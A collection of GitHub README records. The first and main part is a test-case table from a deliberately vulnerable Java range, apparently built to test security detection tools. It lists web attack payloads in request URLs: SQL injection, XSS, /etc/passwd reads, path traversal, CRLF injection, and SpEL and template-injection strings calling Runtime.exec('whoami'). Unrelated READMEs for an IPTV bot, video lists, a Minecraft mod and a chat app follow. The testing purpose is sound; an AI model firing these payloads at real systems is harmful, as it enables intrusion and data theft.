| xss_reflect_escapeHtml_reparir | 反射型XSS漏洞-html编码 | GET | http://192.168.0.9:9990/xss_reflect_escapeHtml?name=<script>alert(123)</script> | 修复 |
| xss_storage_thymeleaf_reparir | 存储型XSS漏洞-thymeleaf模板过滤 | GET | http://192.168.0.9:9990/xss_storage_thymeleaf?name=<script>alert(123)</script> | 修复 |
| file_upload_repair | 任意文件上传漏洞 | POST | http://192.168.0.9:9990/file_upload | 修复 |
| file_read_repair | 文件读取漏洞 | GET | http://192.168.0.9:9990/file_read?filePath=pom.xml | 修复 |
| file_write_repair | 任意文件写入漏洞 | GET | http://192.168.0.9:9990/file_write?fileName=test.txt&data=test | 修复 |
| file_download_repair | 任意文件下载漏洞 | GET | http://192.168.0.9:9990/file_download?fileName=../test.log | 修复 |
| file_delete_repair | 任意文件删除漏洞 | GET | http://192.168.0.9:9990/file_delete?fileName=test.txt | 修复 |
| runtime_command_execute_repair | 命令执行漏洞-Runtime | GET | http://192.168.0.9:9990/runtime_command_execute?command=whoami | 修复 |
| process_builder_command_repair | 命令执行漏洞-ProcessBuilder | GET | http://192.168.0.9:9990/process_builder_command_execute?command=whoami | 修复 |
| crlf_injection_repair | CRLF注入 | GET | http://192.168.0.9:9990/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456 | 修复 |
| spel_expression_repair | SPEL表达式攻击 | GET | http://192.168.0.9:9990/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami') | 修复 |
| ssrf_openStream_repair | SSRF攻击-openStream | GET | http://192.168.0.9:9990/ssrf_openStream?url=https://www.baidu.com | 修复 |
| ssrf_openConnection_repair | SSRF攻击-openConnection | GET | http://192.168.0.9:9990/ssrf_openConnection?url=http://www.baidu.com | 修复 |
| ssrf_requestGet_repair | SSRF攻击-requestGet | GET | http://192.168.0.9:9990/ssrf_requestGet?url=http://www.baidu.com | 修复 |
| ssrf_okhttp_repair | SSRF攻击-okhttp | GET | http://192.168.0.9:9990/ssrf_okhttp?url=http://www.baidu.com | 修复 |
| ssrf_defaultHttpClient_repair | SSRF攻击-defaultHttpClient | GET | http://192.168.0.9:9990/ssrf_defaultHttpClient?url=http://www.baidu.com | 修复 |
| ssti_velocity_repair | SSTI攻击-velocity | GET | http://192.168.0.9:9990/ssti_velocity?content=%23set (%24exp %3d ""exp"")%3b%24exp.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""whoami"") | 修复 |
| xxe_saxparserfactory_repair | XXE-saxparserfactory | POST | http://192.168.0.9:9990/xxe_saxparserfactory | 修复 |
| xxe_xmlreaderfactory_repair | XXE-xmlreaderfactory | POST | http://192.168.0.9:9990/xxe_xmlreaderfactory | 修复 |
| xxe_saxbuilder_repair | XXE-saxbuilder | POST | http://192.168.0.9:9990/xxe_saxbuilder | 修复 |
| xxe_saxreader_repair | XXE-saxreader | POST | http://192.168.0.9:9990/xxe_saxreader | 修复 |
| xxe_documentbuilderfactory_repair | XXE-documentbuilderfactory | POST | http://192.168.0.9:9990/xxe_documentbuilderfactory | 修复 |
| xxe_documentbuilderfactory_xinclude_repair | XXE-documentbuilderfactory_xinclude | POST | http://192.168.0.9:9990/xxe_documentbuilderfactory_xinclude | 修复 |
| OpenRedirector_ModelAndView_repair | URL重定向漏洞-ModelAndView | GET | http://192.168.0.9:9990/OpenRedirector_ModelAndView?url=https://www.baidu.com | 修复 |
| OpenRedirector_sendRedirect_repair | URL重定向漏洞-sendRedirect | GET | http://192.168.0.9:9990/OpenRedirector_sendRedirect?url=https://www.baidu.com | 修复 |
| OpenRedirector_lacation_repair | URL重定向漏洞-location | GET | http://192.168.0.9:9990/OpenRedirector_lacation?url=https://www.baidu.com | 修复 |
| swagger-ui_repair | swagger-ui-未授权访问漏洞 | GET | http://192.168.0.9:9990/swagger-ui.html | 修复 |
| sql_injection_Optional_repair | SQL注入-Optional<String> | GET | http://192.168.0.9:9990/users/findByOptionalUsername?username=test' | 修复 |
| sql_injection_Object_repair | SQL注入-Object[] | POST | http://192.168.0.9:9990/users/get_name_object | 修复 |
| sql_injection_Annotation_repair | SQL注入-MyBatis注解方式 | GET | http://192.168.0.9:9990/users/by-username?name=test | 修复 |
| sql_injection_lombok_repair | SQL注入-lombok | POST | http://192.168.0.9:9990/users/lombok | 修复 |
| sql_injection_hsqldb_repair | SQL注入-hsqldb | GET | http://192.168.0.9:9989/hsqldb_repair?username=1' | 修复 |
| sql_injection_Hibernate_repair | SQL注入-Hibernate | GET | http://192.168.0.9:9988/Hibernate_injection_repair?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'=' | 修复 |
| log4j2_attack | Log4j2 远程代码执行漏洞（CVE-2021-44228） | POST | http://192.168.0.9:9998/log4j2 | 攻击 |
| fastjson1_2_24_attack | fastjson-1.2.24反序列漏洞 | POST | http://192.168.0.9:9999/fastjson1.2.24-process | 攻击 |
| fastjson1_2_25_attack | fastjson-1.2.25-1.2.47反序列漏洞-不需要AutoTypeSupport-通杀 | POST | http://192.168.0.9:9987/fastjson1.2.25-process | 攻击 |
| fastjson1_2_41_attack | fastjson-1.2.25-1.2.41反序列漏洞-setAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.41-process-setAutoTypeSupport | 攻击 |
| fastjson1_2_42_attack | fastjson-1.2.42反序列漏洞 | POST | http://192.168.0.9:9986/fastjson1.2.42-process | 攻击 |
| fastjson1_2_43_attack | fastjson-1.2.43反序列漏洞 | POST | http://192.168.0.9:9985/fastjson1.2.43-process | 攻击 |
| fastjson1_2_45_attack | fastjson-1.2.45反序列漏洞 | POST | http://192.168.0.9:9984/fastjson1.2.45-process | 攻击 |
| fastjson1_2_59_attack_1 | fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59)-payload1 | POST | http://192.168.0.9:9983/fastjson1.2.59-process | 攻击 |
| fastjson1_2_59_attack_2 | fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59)-payload2 | POST | http://192.168.0.9:9983/fastjson1.2.59-process | 攻击 |
| fastjson1_2_60_attack_1 | fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60)-payload1 | POST | http://192.168.0.9:9982/fastjson1.2.60-process | 攻击 |
| fastjson1_2_60_attack_2 | fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60)-payload2 | POST | http://192.168.0.9:9982/fastjson1.2.60-process | 攻击 |
| fastjson1_2_61_attack_1 | fastjson-1.2.61反序列漏洞-payload1 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | 攻击 |
| fastjson1_2_61_attack_2 | fastjson-1.2.61反序列漏洞-payload2 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | 攻击 |
| fastjson1_2_62_attack_1 | fastjson-1.2.62反序列漏洞-payload1 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | 攻击 |
| fastjson1_2_62_attack_2 | fastjson-1.2.62反序列漏洞-payload2 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | 攻击 |
| fastjson1_2_66_attack_1 | fastjson-1.2.66反序列漏洞-payload1 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_2 | fastjson-1.2.66反序列漏洞-payload2 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_3 | fastjson-1.2.66反序列漏洞-payload3 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_4 | fastjson-1.2.66反序列漏洞-payload4 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_5 | fastjson-1.2.66反序列漏洞-payload5 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_66_attack_6 | fastjson-1.2.66反序列漏洞-payload6 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 攻击 |
| fastjson1_2_67_attack_1 | fastjson-1.2.67反序列漏洞-payload1 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | 攻击 |
| fastjson1_2_67_attack_2 | fastjson-1.2.67反序列漏洞-payload2 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | 攻击 |
| fastjson1_2_68_attack_1 | fastjson-1.2.68反序列漏洞-payload1 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | 攻击 |
| fastjson1_2_68_attack_2 | fastjson-1.2.68反序列漏洞-payload2 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | 攻击 |
| fastjson1_2_80_attack | fastjson-1.2.80反序列漏洞 | POST | http://192.168.0.9:9976/fastjson1.2.80-process | 攻击 |
| druid_unauthorized | druid未授权漏洞 | GET | http://192.168.0.9:9997/druid | 攻击 |
| actuator2_unauthorized | SpringBoot Actuator未授权访问漏洞2.X | GET | http://192.168.0.9:9995/actuator | 攻击 |
| actuator1_unauthorized | SpringBoot Actuator未授权访问漏洞1.X | GET | http://192.168.0.9:9993/trace | 攻击 |
| sql_injection_id_attack | SQL注入-mybatics-数字 | GET | http://192.168.0.9:9991/users/1'/ | 攻击 |
| sql_injection_ids_attack | SQL注入-mybatics-数组 | GET | http://192.168.0.9:9991/users/ids/?ids=1,2,3' | 攻击 |
| sql_injection_like_attack | SQL注入-mybatics-like模糊匹配 | GET | http://192.168.0.9:9991/users/name?name=A' | 攻击 |
| sql_injection_strs_attack | SQL注入-mybatics-字符串数组 | GET | http://192.168.0.9:9991/users/names?names=Alice&names=Bob' | 攻击 |
| sql_injection_orderby_attack | SQL注入-mybatics-排序 | GET | http://192.168.0.9:9991/users/sort?orderByColumn=name&orderByDirection=asc' | 攻击 |
| sql_injection_Optional_attack | SQL注入-Optional<String> | GET | http://192.168.0.9:9991/users/findByOptionalUsername?username=test' | 攻击 |
| sql_injection_Object_attack | SQL注入-Object<String> | POST | http://192.168.0.9:9991/users/get_name_object | 攻击 |
| sql_injection_Annotation_attack | SQL注入-MyBatis注解方式 | GET | http://192.168.0.9:9991/users/by-username?name=test' | 攻击 |
| sql_injection_lombok_attack | SQL注入-lombok | POST | http://192.168.0.9:9991/users/lombok | 攻击 |
| sql_injection_hsqldb_attack | SQL注入-hsqldb | GET | http://192.168.0.9:9989/hsqldb?username=1' | 攻击 |
| sql_injection_Hibernate_attack | SQL注入-Hibernate | GET | http://192.168.0.9:9988/Hibernate_injection?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'=' | 攻击 |
| xss_reflect_attack | 反射型XSS漏洞 | GET | http://192.168.0.9:9991/xss_reflect?name=<script>alert(123)</script> | 攻击 |
| xss_storage_attack | 存储型XSS漏洞 | GET | http://192.168.0.9:9991/xss_storage?name=<script>alert(123)</script> | 攻击 |
| xss_dom_attack | DOM XSS漏洞 | POST | http://192.168.0.9:9991/xss_dom | 攻击 |
| file_upload_attack | 任意文件上传漏洞 | POST | http://192.168.0.9:9991/file_upload | 攻击 |
| file_read_attack | 任意文件读取漏洞 | GET | http://192.168.0.9:9991/file_read?filePath=/etc/passwd | 攻击 |
| file_write_attack | 任意文件写入漏洞 | GET | http://192.168.0.9:9991/file_write?fileName=test.txt&data=test | 攻击 |
| file_download_attack | 任意文件下载漏洞 | GET | http://192.168.0.9:9991/file_download?fileName=../pom.xml | 攻击 |
| file_delete_attack | 任意文件删除漏洞 | GET | http://192.168.0.9:9991/file_delete?fileName=test.txt | 攻击 |
| runtime_command_execute | 命令执行漏洞-runtime | GET | http://192.168.0.9:9991/runtime_command_execute?command=whoami | 攻击 |
| process_builder_command_execute | 命令执行漏洞-ProcessBuilder | GET | http://192.168.0.9:9991/process_builder_command_execute?command=whoami | 攻击 |
| crlf_injection_attack | CRLF注入 | GET | http://192.168.0.9:9991/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456 | 攻击 |
| spel_expression_attack | SPEL表达式攻击 | GET | http://192.168.0.9:9991/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami') | 攻击 |
| ssrf_openStream_attack | SSRF攻击-openStream | GET | http://192.168.0.9:9991/ssrf_openStream?url=https://www.baidu.com | 攻击 |
| ssrf_openConnection_attack | SSRF攻击-openConnection | GET | http://192.168.0.9:9991/ssrf_openConnection?url=http://www.baidu.com | 攻击 |
| ssrf_requestGet_attack | SSRF攻击-requestGet | GET | http://192.168.0.9:9991/ssrf_requestGet?url=https://www.baidu.com | 攻击 |
| ssrf_okhttp_attack | SSRF攻击-okhttp | GET | http://192.168.0.9:9991/ssrf_okhttp?url=https://www.baidu.com | 攻击 |
| ssrf_defaultHttpClient_attack | SSRF攻击-defaultHttpClient | GET | http://192.168.0.9:9991/ssrf_defaultHttpClient?url=https://www.baidu.com | 攻击 |
| ssti_velocity_attack | SSTI攻击-velocity | GET | http://192.168.0.9:9991/ssti_velocity?content=%23set (%24exp %3d ""exp"")%3b%24exp.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""whoami"") | 攻击 |
| ssti_freemarker_attack | SSTI攻击-freemarker | GET | http://192.168.0.9:9991/ssti_freemarker?templateContent=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22bash%20-c%20whoami%22%29%20%7D | 攻击 |
| xxe_saxparserfactory_attack | XXE-saxparserfactory | POST | http://192.168.0.9:9991/xxe_saxparserfactory | 攻击 |
| xxe_xmlreaderfactory_attack | XXE-xmlreaderfactory | POST | http://192.168.0.9:9991/xxe_xmlreaderfactory | 攻击 |
| xxe_saxbuilder_attack | XXE-saxbuilder | POST | http://192.168.0.9:9991/xxe_saxbuilder | 攻击 |
| xxe_saxreader_attack | XXE-saxreader | POST | http://192.168.0.9:9991/xxe_saxreader | 攻击 |
| xxe_documentbuilderfactory_attack | XXE-documentbuilderfactory | POST | http://192.168.0.9:9991/xxe_documentbuilderfactory | 攻击 |
| xxe_documentbuilderfactory_xinclude_attack | XXE-documentbuilderfactory_xinclude | POST | http://192.168.0.9:9991/xxe_documentbuilderfactory_xinclude | 攻击 |
| OpenRedirector_ModelAndView_attack | URL重定向漏洞-ModelAndView | GET | http://192.168.0.9:9991/OpenRedirector_ModelAndView?url=https://www.baidu.com | 攻击 |
| OpenRedirector_sendRedirect_attack | URL重定向漏洞-sendRedirect | GET | http://192.168.0.9:9991/OpenRedirector_sendRedirect?url=https://www.baidu.com | 攻击 |
| OpenRedirector_lacation_attack | URL重定向漏洞-location | GET | http://192.168.0.9:9991/OpenRedirector_lacation?url=https://www.baidu.com | 攻击 |
| swagger-ui_attack | swagger-ui-未授权访问漏洞 | GET | http://192.168.0.9:9991/swagger-ui.html | 攻击 |
| xxe_wxpay_attack | 微信支付XXE漏洞 | POST | http://192.168.0.9:9974/wxpay-xxe | 攻击 |
| xstream_CVE-2019-10173 | xstream 反序列化漏洞(CVE-2019-10173) | POST | http://192.168.0.9:9973/CVE-2019-10173 | 攻击 |
| jackson-databind_CVE-2019-12384 | jackson-databind 反序列化漏洞(CVE-2019-12384) | GET | http://192.168.0.9:9971/CVE-2019-12384 | 攻击 |
| log4j2_normal | Log4j2 远程代码执行漏洞（CVE-2021-44228） | POST | http://192.168.0.9:9998/log4j2 | 正常 |
| fastjson_1_2_24_normal | fastjson-1.2.24反序列漏洞 | POST | http://192.168.0.9:9999/fastjson1.2.24-process | 正常 |
| fastjson1_2_25_normal | fastjson-1.2.25-1.2.41反序列漏洞-disableAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.25-process | 正常 |
| fastjson1_2_41_normal | fastjson-1.2.25-1.2.41反序列漏洞-setAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.41-process-setAutoTypeSupport | 正常 |
| fastjson1_2_42_normal | fastjson-1.2.42反序列漏洞 | POST | http://192.168.0.9:9986/fastjson1.2.42-process | 正常 |
| fastjson1_2_43_normal | fastjson-1.2.43反序列漏洞 | POST | http://192.168.0.9:9985/fastjson1.2.43-process | 正常 |
| fastjson1_2_45_normal | fastjson-1.2.45反序列漏洞 | POST | http://192.168.0.9:9984/fastjson1.2.45-process | 正常 |
| fastjson1_2_59_normal | fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59) | POST | http://192.168.0.9:9983/fastjson1.2.59-process | 正常 |
| fastjson1_2_60_normal | fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60) | POST | http://192.168.0.9:9982/fastjson1.2.60-process | 正常 |
| fastjson1_2_61_normal | fastjson-1.2.61反序列漏洞 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | 正常 |
| fastjson1_2_62_normal | fastjson-1.2.62反序列漏洞 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | 正常 |
| fastjson1_2_66_normal | fastjson-1.2.66反序列漏洞 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 正常 |
| fastjson1_2_67_normal | fastjson-1.2.67反序列漏洞 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | 正常 |
| fastjson1_2_68_normal | fastjson-1.2.68反序列漏洞 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | 正常 |
| fastjson1_2_80_normal | fastjson-1.2.80反序列漏洞 | POST | http://192.168.0.9:9976/fastjson1.2.80-process | 正常 |
| fastjson1_2_83_normal | fastjson-1.2.83-反序列漏洞 | POST | http://192.168.0.9:9975/fastjson1.2.83-process | 正常 |
| sql_injection_hsqldb_normal | SQL注入-hsqldb | GET | http://192.168.0.9:9989/hsqldb?username=1' | 正常 |
| sql_injection_lombok_normal | SQL注入-lombok | POST | http://192.168.0.9:9991/users/lombok | 正常 |
| sql_injection_longlist_normal | SQL注入-longlist | POST | http://192.168.0.9:9991/users/findByIds | 正常 |
| sql_injection_longint_normal | SQL注入-longint | POST | http://192.168.0.9:9991/users/getUserByUId | 正常 |
| sql_injection_jpaone_normal | SQL注入-jpaone | GET | http://192.168.0.9:9991/users/jpaone?name=test | 正常 |
| sql_injection_jpawithAnnotations_normal | SQL注入-jpawithAnnotations | GET | http://192.168.0.9:9991/users/jpawithAnnotations?name=test | 正常 |
| sql_injection_Annotation_normal | SQL注入-MyBatis注解方式 | GET | http://192.168.0.9:9991/users/by-username?name=test | 正常 |
| sql_injection_id_normal | SQL注入-mybatics-数字 | GET | http://192.168.0.9:9991/users/1/ | 正常 |
| sql_injection_ids_normal | SQL注入-mybatics-数组 | GET | http://192.168.0.9:9991/users/ids/?ids=1,2,3 | 正常 |
| sql_injection_like_normal | SQL注入-mybatics-like模糊匹配 | GET | http://192.168.0.9:9991/users/name?name=A | 正常 |
| sql_injection_strs_normal | SQL注入-mybatics-字符串数组 | GET | http://192.168.0.9:9991/users/names?names=Alice&names=Bob | 正常 |
| sql_injection_orderby_normal | SQL注入-mybatics-排序 | GET | http://192.168.0.9:9991/users/sort?orderByColumn=name&orderByDirection=asc | 正常 |
| sql_injection_Optional_normal | SQL注入-Optional<String> | GET | http://192.168.0.9:9991/users/findByOptionalUsername?username=test | 正常 |
| sql_injection_Object_normal | SQL注入-Object<String> | POST | http://192.168.0.9:9991/users/get_name_object | 正常 |
| xss_reflect_normal | 反射型XSS漏洞 | GET | http://192.168.0.9:9991/xss_reflect?name=1 | 正常 |
| xss_dom_normal | DOM XSS漏洞 | POST | http://192.168.0.9:9991/xss_dom | 正常 |
| file_download_normal | 任意文件下载漏洞 | GET | http://192.168.0.9:9990/file_download?fileName=test.log | 正常 |
| ReDos_normal_1 | ReDoS攻击-(a+)+ | GET | http://192.168.0.9:9991/testReDos1?input=1 | 正常 |
| ReDos_normal_2 | ReDoS攻击-([a-zA-Z]+)* | GET | http://192.168.0.9:9991/testReDos2?input=1 | 正常 |
| ReDos_normal_3 | ReDoS攻击-(a\|aa)+ | GET | http://192.168.0.9:9991/testReDos3?input=1 | 正常 |
| ReDos_normal_4 | ReDoS攻击-(a\|a?)+ | GET | http://192.168.0.9:9991/testReDos4?input=1 | 正常 |
| ReDos_normal_5 | ReDoS攻击-(.*a){20} | GET | http://192.168.0.9:9991/testReDos5?input=1 | 正常 |
| file_write_normal | 任意文件写入漏洞 | GET | http://192.168.0.9:9990/file_write?fileName=test.log&data=test | 正常 |
| runtime_command_execute_normal | 命令执行漏洞-Runtime | GET | http://192.168.0.9:9990/runtime_command_execute?command=ls | 正常 |
| process_builder_command_normal | 命令执行漏洞-ProcessBuilder | GET | http://192.168.0.9:9990/process_builder_command_execute?command=ls | 正常 |
| spel_expression_normal | SPEL表达式攻击 | GET | http://192.168.0.9:9990/spel_expression?input=1 | 正常 |
| ssrf_openStream_normal | SSRF攻击-openStream | GET | http://192.168.0.9:9990/ssrf_openStream?url=http://example.com | 正常 |
| ssrf_openConnection_normal | SSRF攻击-openConnection | GET | http://192.168.0.9:9990/ssrf_openConnection?url=http://example.com | 正常 |
| ssrf_requestGet_normal | SSRF攻击-requestGet | GET | http://192.168.0.9:9990/ssrf_requestGet?url=http://example.com | 正常 |
| ssrf_okhttp_normal | SSRF攻击-okhttp | GET | http://192.168.0.9:9990/ssrf_okhttp?url=http://example.com | 正常 |
| ssrf_defaultHttpClient_normal | SSRF攻击-defaultHttpClient | GET | http://192.168.0.9:9990/ssrf_defaultHttpClient?url=http://example.com | 正常 |
| OpenRedirector_ModelAndView_normal | URL重定向漏洞-ModelAndView | GET | http://192.168.0.9:9990/OpenRedirector_ModelAndView?url=https://example.com | 正常 |
| OpenRedirector_sendRedirect_normal | URL重定向漏洞-sendRedirect | GET | http://192.168.0.9:9990/OpenRedirector_sendRedirect?url=https://example.com | 正常 |
| OpenRedirector_lacation_normal | URL重定向漏洞-location | GET | http://192.168.0.9:9990/OpenRedirector_lacation?url=https://example.com | 正常 |
| druid_sqlwall | druid-SQL防火墙 | GET | http://192.168.0.9:9997/druid_sql?id=1 | 误报 |


## 参考开发代码

- https://github.com/vulhub/vulhub
- https://github.com/l4yn3/micro_service_seclab
- https://github.com/ffffffff0x/JVWA
- https://github.com/mamba-2021/myjavavul
- https://github.com/zhlu32/range_java_micro_service_seclab
- https://rasp.baidu.com/doc/install/testcase.html
- https://github.com/lemono0/FastJsonParty/
- https://github.com/roottusk/vapi

## Star History Chart

[![Star History Chart](https://api.star-history.com/svg?repos=lokerxx/JavaVul&type=Date)](https://star-history.com/#lokerxx/JavaVul&Date)

## 待进行

- [x] cas-client xxe（漏洞和修复）
- [ ] SQL注入传 order by 参数, 白名单列表（误报）
",0,0,1,Apache-2.0
mercyblitz/java-zsxq,main,"# 小马哥 Java 知识星球
",0,0,1,Apache-2.0
ShafiqSadat/IPTVTelegramBot,master,"# IPTV Telegram Bot

IPTV Telegram Bot is a bot that lets you watch IPTV streams right in Telegram App. IPTV stands for Internet Protocol Television, which is a way of delivering live TV channels over the internet. With this bot, you can send the name of the channel you want to watch, and the bot will respond with available streams to watch. There are over 60000+ online streams from all over the world, covering various genres and languages.

![Screenshot of IPTV Telegram Bot](https://i.imgur.com/XVsp1Nd.png)

![Screenshot of IPTV Telegram Bot](https://raw.githubusercontent.com/ShafiqSadat/IPTVTelegramBot/master/screenshots/1.gif)
## How to use

- Clone this repository or download the zip file.
- Install the requirements using `mvn install`.
- Create a bot using [@BotFather](https://t.me/BotFather) and get the bot token.
- In BotFather, send the ""/setmenubutton"" command, select your bot, and send the following link: ```https://iptvnator.vercel.app/```. Then, provide a name for the button, such as ""Open Player.""
- Rename example_local.properties into local.properties under /src/main/resources/example_local.properties
- Edit the local.properties file and enter your bot token and username.
- Run the Main.java file using `java Main`.
- Start your bot and enjoy watching IPTV streams.

## Credits

- IPTV API: [iptv-org/iptv](https://github.com/iptv-org/iptv)
- Telegram API: [rubenlagus/TelegramBots](https://github.com/rubenlagus/TelegramBots)
- IPTV Player: [4gray/iptvnator](https://github.com/4gray/iptvnator)

## License

This project is licensed under the MIT License - see the [LICENSE] file for details.

## Contributing

If you want to contribute to this project, you are welcome to do so. Please follow these steps:

- Fork this repository and create a new branch for your feature or bug fix.
- Write your code and test it locally.
- Commit and push your changes to your forked repository.
- Create a pull request with a clear description of your changes and a link to the issue (if any) that you are addressing.
- Wait for the maintainer to review and merge your pull request.

## Contact

If you have any questions, suggestions, or feedback, you can contact me via:

- Email: ShafiqSadat2012@gmail.com
- Telegram: [@Shafiq](https://t.me/Shafiq)

## License
IPTVTelegramBot is licensed under the MIT License. The terms are as follows:

```
The MIT License (MIT)

Copyright (c) 2024 Shafiq Sadat

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
",1,0,1,MIT
Javabykiran-Angular/161_AdvancedJava,main,"# 161_AdvancedJava

Youtube Channel https://www.youtube.com/c/SumitNiche

linkedin.com/in/ sumit-raokhande-09aaba21

github.com/ sumitrao007

sumitrao007.github.io

See The Spring Boot Series https://www.youtube.com/watch?v=1cecOdE2ZN8&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm

https://www.youtube.com/watch?v=1cecOdE2ZN8&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=1

https://www.youtube.com/watch?v=NJaZMBH1M70&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=2

https://www.youtube.com/watch?v=0dudLT-fnrg&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=3

https://www.youtube.com/watch?v=gl4onrUJLUw&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=4

https://www.youtube.com/watch?v=XrX5Iu_Ri2k&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=5

https://www.youtube.com/watch?v=UzL160N7M8g&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=6

https://www.youtube.com/watch?v=RDfwnHWF_Rg&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=7

https://www.youtube.com/watch?v=py3GAGVEpu4&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=8

https://www.youtube.com/watch?v=qE0B6DsPTr4&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=9

https://www.youtube.com/watch?v=yAldDf9lVqY&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=10

https://www.youtube.com/watch?v=yOoTBBZjG_4&list=PLa3i9wpSPojGRBeYmmhVkl76bmqih4vGm&index=11

See the Angular 8 Series https://youtube.com/playlist?list=PLa3i9wpSPojEDNTe66s5XhXPSd50XqjSv

1 https://www.youtube.com/watch?v=jBBTYKIgNT8&list=PLa3i9wpSPojEDNTe66s5XhXPSd50XqjSv&index=2&t=12s

2 https://www.youtube.com/watch?v=qbuBY_xa57Q&list=PLa3i9wpSPojEDNTe66s5XhXPSd50XqjSv&index=2

3 https://www.youtube.com/watch?v=4Mn7ZILjwHs&list=PLa3i9wpSPojEDNTe66s5XhXPSd50XqjSv&index=3

4 https://www.youtube.com/watch?v=DX3jiyQmTjo&list=PLa3i9wpSPojEDNTe66s5XhXPSd50XqjSv&index=4

5 https://www.youtube.com/watch?v=cwj9QrOu1w8&list=PLa3i9wpSPojEDNTe66s5XhXPSd50XqjSv&index=5

6 https://www.youtube.com/watch?v=bOYj5rdEfPM&list=PLa3i9wpSPojEDNTe66s5XhXPSd50XqjSv&index=6

See The Angular Project Series https://youtube.com/playlist?list=PLa3i9wpSPojEjJLQvdi4G4UXtd0pcKrZh

1 https://youtu.be/SmqIB2d-Xbg

2 https://youtu.be/5lKwN6rngF0

3 https://youtu.be/Zgmw-GW5kZc

4 https://youtu.be/GbP-BS_nb3Q

5 https://youtu.be/e9-F4P_ChTs

6 https://youtu.be/gh83484qW_8

7 https://youtu.be/VLv5labtAjk

8 https://youtu.be/7SRHWQrghqY

9 https://youtu.be/MnmrXTnqt4o
",0,0,1,
sjrsjz/vulkanite-modified,main,"# Work in progress
Minecraft mod that adds hardware raytracing support to minecraft using opengl vulkan interop

Enables extra passes that shader devs can use with raytracing passes

**this version can identify world type**
",1,1,1,LGPL-3.0
sasmithx/Chat_Application_Socket_Progrmming,master,"![Logo](https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Client-Server-Network-Model.jpg)

# PLAY TECH PVT LTD.

This project is a simple chat application built using Java Socket programming. It features a client-server architecture, enabling real-time text and image communication between multiple clients. The application also includes an emoji picker, allowing users to send emojis in their chat messages.

## Table of Contents

- Features
- Technologies Used
- Setup
- How to Run
- Usage
- Screenshots
- Contributing
- License
- Contact

## Features

- Real-time text communication between clients.
- Ability to send and receive images.
- Emoji picker for sending emojis in chat.
- User authentication based on a simple name validation.
- Responsive and intuitive user interface.

## Technologies Used

- **Java:** Core programming language.
- **JavaFX:** Used for the graphical user interface.
- **Socket Programming:** Used for client-server communication.
- **FXML:** For defining the UI layout.
- **CSS:** For styling the UI components.

## Setup

To set up the project locally, follow these steps:

**1.** **Clone the repository:**
```bash
https://github.com/sasmithx/Chat_Application_Socket_Progrmming.git
```
**2.** **Import the project:**

- Open your favorite IDE (like IntelliJ IDEA, Eclipse, or NetBeans).
- Import the project as a Maven/Gradle project.
